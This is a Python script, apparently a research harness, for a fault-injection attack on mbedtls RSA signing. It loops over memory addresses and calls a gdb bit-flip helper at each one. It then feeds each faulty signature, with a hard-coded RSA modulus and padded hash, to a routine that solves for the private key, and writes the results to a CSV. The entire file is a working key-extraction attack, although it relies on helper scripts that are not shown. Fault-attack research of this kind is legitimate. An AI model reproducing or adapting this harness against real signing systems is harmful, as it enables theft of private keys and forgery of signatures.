import csv
import mbedtls_utils2 as mu
import os
import subprocess

all_data = []

e = int("010001", 16)
n = int("AE1EC41FDD978C18CB43F9587F9B85DF804603100611497DCB445D157E44E717C78D53FAC3644DEA302645F6CFF852A785C3DAEA525BE01A4B1960D6512D97C677436ED17D03A55DDD8E41D737456C2B1512D533806EB048C5570269CBDFABB5E335821CE69C892A825A3896FC46990A8F6FECC759DAD9D6FD76BBF55BAA34B0789CACE898B6CC8CDBB50A0BFE7073A31DAF0B67845F76B71D42942B03FC02D6D68789C6CEF502C39AA0FB392E5E84BD1581E7295BDF6C45463FEA20A5220413381B82A72F95B1BB29AC6E833B70EB5B9F9D43B4D56A94ECBD02C1CBC8C8EED903485BD2A379A8B81B8FE20216EE6019A5F19656A483CCD9C23EB3B17678050B", 16)
m = int("0001ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff003031300d0609608648016503040201050004207e6bb673f061cfd23cba009e648143fb07ac77dcd1681f6a9af9d5fe7c0f7f4b", 16)
sigfile = "example.txt.sig"

for i in range(0x40d27b, 0x40d4b1):
	subprocess.call(["./gdb_flip.sh", str(i)])
	i_data = {}
	i_data['Memory Address'] = hex(i)
	s = mu.read_sig_file(sigfile)
	if not(s == "failed"):
		pkeys = mu.solve_private_keys(e, s, m, n)
		i_data['Private Keys'] = pkeys
		os.remove(sigfile)
		# try to decrypt some message so you know whether the private keys are correct
	else:
		i_data['Private Keys'] = "failed"

	all_data.append(i_data)

# print all_data
fields = ['Memory Address', 'Private Keys']
with open('results_mbedtls.csv', 'wb') as f:
    writer = csv.DictWriter(f, fieldnames = fields)
    writer.writeheader()
    writer.writerows(all_data)